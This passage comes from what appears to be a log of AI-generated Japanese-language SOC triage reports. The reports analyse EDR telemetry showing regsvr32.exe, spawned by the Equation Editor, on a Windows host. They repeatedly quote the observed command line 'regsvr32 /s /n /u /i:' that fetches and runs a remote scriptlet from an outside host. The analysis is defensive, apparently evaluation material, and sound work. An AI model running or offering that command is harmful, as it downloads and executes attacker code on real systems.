    \"step_id\": 7,\n      \"subject\": \"regsvr32.exe\",\n      \"operation\": \"registry value write\",\n      \"object\": \"HKU\\\\S-1-5-21-450080267-1945256726-3465656282-1000\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ZoneMap\\\\AutoDetect\",\n      \"evidence\": {\n        \"timestamp\": \"2022-07-19 14:33:24\",\n        \"pid\": \"6124\",\n        \"process_name\": \"regsvr32.exe\",\n        \"source_stream\": \"cbc-edr\",\n        \"access\": \"ACTION_WRITE_VALUE\"\n      }\n    }\n  ],\n  \"code_sequence\": [\n    \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\",\n    \"c:\\\\windows\\\\system32\\\\scrobj.dll\",\n    \"c:\\\\windows\\\\system32\\\\winhttp.dll\",\n    \"c:\\\\users\\\\aalsahee\\\\appdata\\\\local\\\\microsoft\\\\windows\\\\temporary internet files\\\\counters.dat\",\n    \"HKU\\\\S-1-5-21-450080267-1945256726-3465656282-1000\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ZoneMap\\\\UNCAsIntranet\",\n    \"HKU\\\\S-1-5-21-450080267-1945256726-3465656282-1000\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ZoneMap\\\\AutoDetect\"\n  ],\n  \"summary\": \"2022-07-19 14:33:24 に WIN-32-H1 上で regsvr32.exe (pid 6124) が eqnedt32.exe (ppid 6032) から起動され、command_line に外部 URL http://ortrta.net:8080/sF5riGj4K26DK.sct を含む実行が観測された。同一主体で scrobj.dll と winhttp.dll のロード、Temporary Internet Files 配下の counters.dat へのアクセス、ZoneMap のレジストリ値書き込みが続いており、ortrta.net:8080 への外部参照も観測された。直接の子プロセスは確認できていない。\",\n  \"unresolved_frontier\": [\n    {\n      \"entity\": \"regsvr32.exe\",\n      \"evidence\": \"timestamp 2022-07-19 14:33:24, pid 6124, command_line に http://ortrta.net:8080/sF5riGj4K26DK.sct を含む\",\n      \"missing_edge\": \"同一主体の追加の child process または DNS 名前解決行\",\n      \"why_it_matters\": \"regsvr32.exe の行動列をネットワーク/プロセス連鎖としてさらに確定できる可能性があるため\"\n    }\n  ]\n}",
+      "usage_metadata": {
+        "input_tokens": 5250,
+        "output_tokens": 1667,
+        "total_tokens": 6917,
+        "input_token_details": {
+          "audio": 0,
+          "cache_read": 4224
+        },
+        "output_token_details": {
+          "audio": 0,
+          "reasoning": 0
+        }
+      }
+    },
+    {
+      "type": "AIMessage",
+      "content": "{\n  \"input_scope\": {\n    \"host\": \"WIN-32-H1\",\n    \"process\": \"regsvr32.exe\",\n    \"timestamp\": \"2022-07-19 14:31:00\",\n    \"condition\": \"stage3\",\n    \"input_fields_used\": [\n      \"host\",\n      \"process\",\n      \"timestamp\"\n    ]\n  },\n  \"code_steps\": [\n    {\n      \"step_id\": \"S1\",\n      \"order\": 1,\n      \"time\": \"2022-07-19 14:33:24\",\n      \"subject_process\": {\n        \"name\": \"regsvr32.exe\",\n        \"pid\": 6124,\n        \"path\": null\n      },\n      \"operation\": \"process_execution\",\n      \"object\": {\n        \"type\": \"process\",\n        \"name\": \"regsvr32.exe\",\n        \"path\": null,\n        \"value\": null,\n        \"data\": null\n      },\n      \"command_line\": \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\",\n      \"execution_context\": {\n        \"parent_process\": \"eqnedt32.exe\",\n        \"parent_pid\": 6032,\n        \"parent_command_line\": \"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\",\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"command_line\",\n          \"value\": \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\",\n          \"pid\": 6124,\n          \"ppid\": 6032\n        },\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"parent_process_name\",\n          \"value\": \"eqnedt32.exe\",\n          \"pid\": 6124,\n          \"ppid\": 6032\n        },\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"parent_command_line\",\n          \"value\": \"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\",\n          \"pid\": 6124,\n          \"ppid\": 6032\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": [\n        \"直接の child_process は観測されていない。\",\n        \"process path はこの行からは未取得。\"\n      ]\n    },\n    {\n      \"step_id\": \"S2\",\n      \"order\": 2,\n      \"time\": \"2022-07-19 14:33:24\",\n      \"subject_process\": {\n        \"name\": \"regsvr32.exe\",\n        \"pid\": 6124,\n        \"path\": null\n      },\n      \"operation\": \"network_connection\",\n      \"object\": {\n        \"type\": \"network\",\n        \"name\": \"ortrta.net\",\n        \"path\": null,\n        \"value\": \"10.193.66.115:8080\",\n        \"data\": null\n      },\n      \"command_line\": \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\",\n      \"execution_context\": {\n        \"parent_process\": \"eqnedt32.exe\",\n        \"parent_pid\": 6032,\n        \"parent_command_line\": \"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\",\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"netconn_domain\",\n          \"value\": \"ortrta.net\",\n          \"pid\": 6124,\n          \"ppid\": null\n        },\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"remote_ip\",\n          \"value\": \"10.193.66.115\",\n          \"pid\": 6124,\n          \"ppid\": null\n        },\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"remote_port\",\n          \"value\": \"8080\",\n          \"pid\": 6124,\n          \"ppid\": null\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": [\n        \"DNS 名前解決行は未確認。\",\n        \"同一 PID の追加接続は未確認。\"\n      ]\n    },\n    {\n      \"step_id\": \"S3\",\n      \"order\": 3,\n      \"time\": \"2022-07-19 14:33:24\",\n      \"subject_process\": {\n        \"name\": \"regsvr32.exe\",\n        \"pid\": 6124,\n        \"path\": null\n      },\n      \"operation\": \"module_load\",\n      \"object\": {\n        \"type\": \"file\",\n        \"name\": \"scrobj.dll\",\n        \"path\": \"c:\\\\windows\\\\system32\\\\scrobj.dll\",\n        \"value\": null,\n        \"data\": null\n      },\n      \"command_line\": \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\",\n      \"execution_context\": {\n        \"parent_process\": \"eqnedt32.exe\",\n        \"parent_pid\": 6032,\n        \"parent_command_line\": \"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\",\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"modload_name\",\n          \"value\": \"c:\\\\windows\\\\system32\\\\scrobj.dll\",\n          \"pid\": 6124,\n          \"ppid\": null\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": []\n    },\n    {\n      \"step_id\": \"S4\",\n      \"order\": 4,\n      \"time\": \"2022-07-19 14:33:24\",\n      \"subject_process\": {\n        \"name\": \"regsvr32.exe\",\n        \"pid\": 6124,\n        \"path\": null\n      },\n      \"operation\": \"module_load\",\n      \"object\": {\n        \"type\": \"file\",\n        \"name\": \"winhttp.dll\",\n        \"path\": \"c:\\\\windows\\\\system32\\\\winhttp.dll\",\n        \"value\": null,\n        \"data\": null\n      },\n      \"command_line\": \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\",\n      \"execution_context\": {\n        \"parent_process\": \"eqnedt32.exe\",\n        \"parent_pid\": 6032,\n        \"parent_command_line\": \"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\",\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"modload_name\",\n          \"value\": \"c:\\\\windows\\\\system32\\\\winhttp.dll\",\n          \"pid\": 6124,\n          \"ppid\": null\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": []\n    },\n    {\n      \"step_id\": \"S5\",\n      \"order\": 5,\n      \"time\": \"2022-07-19 14:33:24\",\n      \"subject_process\": {\n        \"name\": \"regsvr32.exe\",\n        \"pid\": 6124,\n        \"path\": null\n      },\n      \"operation\": \"file_access\",\n      \"object\": {\n        \"type\": \"file\",\n        \"name\": \"counters.dat\",\n        \"path\": \"c:\\\\users\\\\aalsahee\\\\appdata\\\\local\\\\microsoft\\\\windows\\\\temporary internet files\\\\counters.dat\",\n        \"value\": null,\n        \"data\": null\n      },\n      \"command_line\": \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\",\n      \"execution_context\": {\n        \"parent_process\": \"eqnedt32.exe\",\n        \"parent_pid\": 6032,\n        \"parent_command_line\": \"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\",\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"object\",\n          \"value\": \"c:\\\\users\\\\aalsahee\\\\appdata\\\\local\\\\microsoft\\\\windows\\\\temporary internet files\\\\counters.dat\",\n          \"pid\": 6124,\n          \"ppid\": null\n        },\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"access\",\n          \"value\": \"ACTION_FILE_MOD_OPEN | ACTION_FILE_OPEN_READ | ACTION_FILE_OPEN_WRITE | ACTION_FILE_OPEN_SET_ATTRIBUTES\",\n          \"pid\": 6124,\n          \"ppid\": null\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": []\n    },\n    {\n      \"step_id\": \"S6\",\n      \"order\": 6,\n      \"time\": \"2022-07-19 14:33:24\",\n      \"subject_process\": {\n        \"name\": \"regsvr32.exe\",\n        \"pid\": 6124,\n        \"path\": null\n      },\n      \"operation\": \"registry_value_write\",\n      \"object\": {\n        \"type\": \"registry_value\",\n        \"name\": \"UNCAsIntranet\",\n        \"path\": \"HKU\\\\S-1-5-21-450080267-1945256726-3465656282-1000\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ZoneMap\\\\UNCAsIntranet\",\n        \"value\": null,\n        \"data\": null\n      },\n      \"command_line\": \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\",\n      \"execution_context\": {\n        \"parent_process\": \"eqnedt32.exe\",\n        \"parent_pid\": 6032,\n        \"parent_command_line\": \"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\",\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"object\",\n          \"value\": \"HKU\\\\S-1-5-21-450080267-1945256726-3465656282-1000\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ZoneMap\\\\UNCAsIntranet\",\n          \"pid\": 6124,\n          \"ppid\": null\n        },\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"access\",\n          \"value\": \"ACTION_WRITE_VALUE\",\n          \"pid\": 6124,\n          \"ppid\": null\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": []\n    },\n    {\n      \"step_id\": \"S7\",\n      \"order\": 7,\n      \"time\": \"2022-07-19 14:33:24\",\n      \"subject_process\": {\n        \"name\": \"regsvr32.exe\",\n        \"pid\": 6124,\n        \"path\": null\n      },\n      \"operation\": \"registry_value_write\",\n      \"object\": {\n        \"type\": \"registry_value\",\n        \"name\": \"AutoDetect\",\n        \"path\": \"HKU\\\\S-1-5-21-450080267-1945256726-3465656282-1000\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ZoneMap\\\\AutoDetect\",\n        \"value\": null,\n        \"data\": null\n      },\n      \"command_line\": \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\",\n      \"execution_context\": {\n        \"parent_process\": \"eqnedt32.exe\",\n        \"parent_pid\": 6032,\n        \"parent_command_line\": \"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\",\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"object\",\n          \"value\": \"HKU\\\\S-1-5-21-450080267-1945256726-3465656282-1000\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ZoneMap\\\\AutoDetect\",\n          \"pid\": 6124,\n          \"ppid\": null\n        },\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"access\",\n          \"value\": \"ACTION_WRITE_VALUE\",\n          \"pid\": 6124,\n          \"ppid\": null\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": []\n    }\n  ],\n  \"code_sequence\": [\n    \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\",\n    \"ortrta.net:8080\",\n    \"c:\\\\windows\\\\system32\\\\scrobj.dll\",\n    \"c:\\\\windows\\\\system32\\\\winhttp.dll\",\n    \"c:\\\\users\\\\aalsahee\\\\appdata\\\\local\\\\microsoft\\\\windows\\\\temporary internet files\\\\counters.dat\",\n    \"HKU\\\\S-1-5-21-450080267-1945256726-3465656282-1000\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ZoneMap\\\\UNCAsIntranet\",\n    \"HKU\\\\S-1-5-21-450080267-1945256726-3465656282-1000\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ZoneMap\\\\AutoDetect\"\n  ],\n  \"supporting_alert_evidence\": [\n    {\n      \"alert_id\": null,\n      \"alert_name\": null,\n      \"source_stream\": null,\n      \"why_supporting_only\": \"CBC alert summary は入力条件上 hidden であり、今回の要約は観測済み telemetry のみで構成しているため。\"\n    }\n  ],\n  \"triage_decision\": {\n    \"alert_disposition\": \"not_applicable\",\n    \"host_disposition\": \"escalate_host_investigation\",\n    \"evidence_basis\": [\n      \"regsvr32.exe (pid 6124) が eqnedt32.exe (ppid 6032) から起動され、外部 URL を含む command_line で実行されている。\",\n      \"同一主体で ortrta.net:8080 へのネットワーク接続、scrobj.dll と winhttp.dll のロード、Temporary Internet Files と ZoneMap への書き込みが観測されている。\"\n    ]\n  },\n  \"excluded_nearby_evidence\": [\n    {\n      \"time\": \"2022-07-19 14:33:24\",\n      \"source_stream\": \"cbc-edr\",\n      \"pid\": 6124,\n      \"ppid\": 6032,\n      \"description\": \"regsvr32.exe から直接の child_process は観測されていないため、主chain には追加していない。\"\n    },\n    {\n      \"time\": \"2022-07-19 14:33:24\",\n      \"source_stream\": \"cbc-edr\",\n      \"pid\": 6032,\n      \"ppid\": 648,\n      \"description\": \"EQNEDT32.EXE のさらに上位の起点は今回の主chain に不要なため除外した。\"\n    }\n  ],\n  \"global_limitations\": [\n    \"Stage 3 のため CBC alert summary rows は hidden であり、alert_name / alert_reason は観測できていない。\",\n    \"regsvr32.exe の process path はこの証拠群では未取得。\",\n    \"直接の child_process、DNS 名前解決行、別宛先の追加接続は未確認。\"\n  ],\n  \"timeline_ja\": [\n    \"2022-07-19 14:33:24 に WIN-32-H1 上で regsvr32.exe (pid 6124) が eqnedt32.exe から起動された。\",\n    \"同時刻の command_line に http://ortrta.net:8080/sF5riGj4K26DK.sct が含まれていた。\",\n    \"同一主体で ortrta.net:8080 への接続、scrobj.dll と winhttp.dll のロード、Temporary Internet Files と ZoneMap への操作が続いた。\"\n  ]\n}",
+      "usage_metadata": {
+        "input_tokens": 7670,
+        "output_tokens": 4258,
+        "total_tokens": 11928,
+        "input_token_details": {
+          "audio": 0,
+          "cache_read": 0
+        },
+        "output_token_details": {
+          "audio": 0,
+          "reasoning": 0
+        }
+      }
+    }
+  ],
+  "output_text": "{\n  \"input_scope\": {\n    \"host\": \"WIN-32-H1\",\n    \"process\": \"regsvr32.exe\",\n    \"timestamp\": \"2022-07-19 14:31:00\",\n    \"condition\": \"stage3\",\n    \"input_fields_used\": [\n      \"host\",\n      \"process\",\n      \"timestamp\"\n    ]\n  },\n  \"code_steps\": [\n    {\n      \"step_id\": \"S1\",\n      \"order\": 1,\n      \"time\": \"2022-07-19 14:33:24\",\n      \"subject_process\": {\n        \"name\": \"regsvr32.exe\",\n        \"pid\": 6124,\n        \"path\": null\n      },\n      \"operation\": \"process_execution\",\n      \"object\": {\n        \"type\": \"process\",\n        \"name\": \"regsvr32.exe\",\n        \"path\": null,\n        \"value\": null,\n        \"data\": null\n      },\n      \"command_line\": \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\",\n      \"execution_context\": {\n        \"parent_process\": \"eqnedt32.exe\",\n        \"parent_pid\": 6032,\n        \"parent_command_line\": \"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\",\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"command_line\",\n          \"value\": \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\",\n          \"pid\": 6124,\n          \"ppid\": 6032\n        },\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"parent_process_name\",\n          \"value\": \"eqnedt32.exe\",\n          \"pid\": 6124,\n          \"ppid\": 6032\n        },\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"parent_command_line\",\n          \"value\": \"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\",\n          \"pid\": 6124,\n          \"ppid\": 6032\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": [\n        \"直接の child_process は観測されていない。\",\n        \"process path はこの行からは未取得。\"\n      ]\n    },\n    {\n      \"step_id\": \"S2\",\n      \"order\": 2,\n      \"time\": \"2022-07-19 14:33:24\",\n      \"subject_process\": {\n        \"name\": \"regsvr32.exe\",\n        \"pid\": 6124,\n        \"path\": null\n      },\n      \"operation\": \"network_connection\",\n      \"object\": {\n        \"type\": \"network\",\n        \"name\": \"ortrta.net\",\n        \"path\": null,\n        \"value\": \"10.193.66.115:8080\",\n        \"data\": null\n      },\n      \"command_line\": \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\",\n      \"execution_context\": {\n        \"parent_process\": \"eqnedt32.exe\",\n        \"parent_pid\": 6032,\n        \"parent_command_line\": \"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\",\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"netconn_domain\",\n          \"value\": \"ortrta.net\",\n          \"pid\": 6124,\n          \"ppid\": null\n        },\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"remote_ip\",\n          \"value\": \"10.193.66.115\",\n          \"pid\": 6124,\n          \"ppid\": null\n        },\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"remote_port\",\n          \"value\": \"8080\",\n          \"pid\": 6124,\n          \"ppid\": null\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": [\n        \"DNS 名前解決行は未確認。\",\n        \"同一 PID の追加接続は未確認。\"\n      ]\n    },\n    {\n      \"step_id\": \"S3\",\n      \"order\": 3,\n      \"time\": \"2022-07-19 14:33:24\",\n      \"subject_process\": {\n        \"name\": \"regsvr32.exe\",\n        \"pid\": 6124,\n        \"path\": null\n      },\n      \"operation\": \"module_load\",\n      \"object\": {\n        \"type\": \"file\",\n        \"name\": \"scrobj.dll\",\n        \"path\": \"c:\\\\windows\\\\system32\\\\scrobj.dll\",\n        \"value\": null,\n        \"data\": null\n      },\n      \"command_line\": \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\",\n      \"execution_context\": {\n        \"parent_process\": \"eqnedt32.exe\",\n        \"parent_pid\": 6032,\n        \"parent_command_line\": \"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\",\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"modload_name\",\n          \"value\": \"c:\\\\windows\\\\system32\\\\scrobj.dll\",\n          \"pid\": 6124,\n          \"ppid\": null\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": []\n    },\n    {\n      \"step_id\": \"S4\",\n      \"order\": 4,\n      \"time\": \"2022-07-19 14:33:24\",\n      \"subject_process\": {\n        \"name\": \"regsvr32.exe\",\n        \"pid\": 6124,\n        \"path\": null\n      },\n      \"operation\": \"module_load\",\n      \"object\": {\n        \"type\": \"file\",\n        \"name\": \"winhttp.dll\",\n        \"path\": \"c:\\\\windows\\\\system32\\\\winhttp.dll\",\n        \"value\": null,\n        \"data\": null\n      },\n      \"command_line\": \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\",\n      \"execution_context\": {\n        \"parent_process\": \"eqnedt32.exe\",\n        \"parent_pid\": 6032,\n        \"parent_command_line\": \"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\",\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"modload_name\",\n          \"value\": \"c:\\\\windows\\\\system32\\\\winhttp.dll\",\n          \"pid\": 6124,\n          \"ppid\": null\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": []\n    },\n    {\n      \"step_id\": \"S5\",\n      \"order\": 5,\n      \"time\": \"2022-07-19 14:33:24\",\n      \"subject_process\": {\n        \"name\": \"regsvr32.exe\",\n        \"pid\": 6124,\n        \"path\": null\n      },\n      \"operation\": \"file_access\",\n      \"object\": {\n        \"type\": \"file\",\n        \"name\": \"counters.dat\",\n        \"path\": \"c:\\\\users\\\\aalsahee\\\\appdata\\\\local\\\\microsoft\\\\windows\\\\temporary internet files\\\\counters.dat\",\n        \"value\": null,\n        \"data\": null\n      },\n      \"command_line\": \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\",\n      \"execution_context\": {\n        \"parent_process\": \"eqnedt32.exe\",\n        \"parent_pid\": 6032,\n        \"parent_command_line\": \"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\",\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"object\",\n          \"value\": \"c:\\\\users\\\\aalsahee\\\\appdata\\\\local\\\\microsoft\\\\windows\\\\temporary internet files\\\\counters.dat\",\n          \"pid\": 6124,\n          \"ppid\": null\n        },\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"access\",\n          \"value\": \"ACTION_FILE_MOD_OPEN | ACTION_FILE_OPEN_READ | ACTION_FILE_OPEN_WRITE | ACTION_FILE_OPEN_SET_ATTRIBUTES\",\n          \"pid\": 6124,\n          \"ppid\": null\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": []\n    },\n    {\n      \"step_id\": \"S6\",\n      \"order\": 6,\n      \"time\": \"2022-07-19 14:33:24\",\n      \"subject_process\": {\n        \"name\": \"regsvr32.exe\",\n        \"pid\": 6124,\n        \"path\": null\n      },\n      \"operation\": \"registry_value_write\",\n      \"object\": {\n        \"type\": \"registry_value\",\n        \"name\": \"UNCAsIntranet\",\n        \"path\": \"HKU\\\\S-1-5-21-450080267-1945256726-3465656282-1000\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ZoneMap\\\\UNCAsIntranet\",\n        \"value\": null,\n        \"data\": null\n      },\n      \"command_line\": \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\",\n      \"execution_context\": {\n        \"parent_process\": \"eqnedt32.exe\",\n        \"parent_pid\": 6032,\n        \"parent_command_line\": \"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\",\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"object\",\n          \"value\": \"HKU\\\\S-1-5-21-450080267-1945256726-3465656282-1000\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ZoneMap\\\\UNCAsIntranet\",\n          \"pid\": 6124,\n          \"ppid\": null\n        },\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"access\",\n          \"value\": \"ACTION_WRITE_VALUE\",\n          \"pid\": 6124,\n          \"ppid\": null\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": []\n    },\n    {\n      \"step_id\": \"S7\",\n      \"order\": 7,\n      \"time\": \"2022-07-19 14:33:24\",\n      \"subject_process\": {\n        \"name\": \"regsvr32.exe\",\n        \"pid\": 6124,\n        \"path\": null\n      },\n      \"operation\": \"registry_value_write\",\n      \"object\": {\n        \"type\": \"registry_value\",\n        \"name\": \"AutoDetect\",\n        \"path\": \"HKU\\\\S-1-5-21-450080267-1945256726-3465656282-1000\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ZoneMap\\\\AutoDetect\",\n        \"value\": null,\n        \"data\": null\n      },\n      \"command_line\": \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\",\n      \"execution_context\": {\n        \"parent_process\": 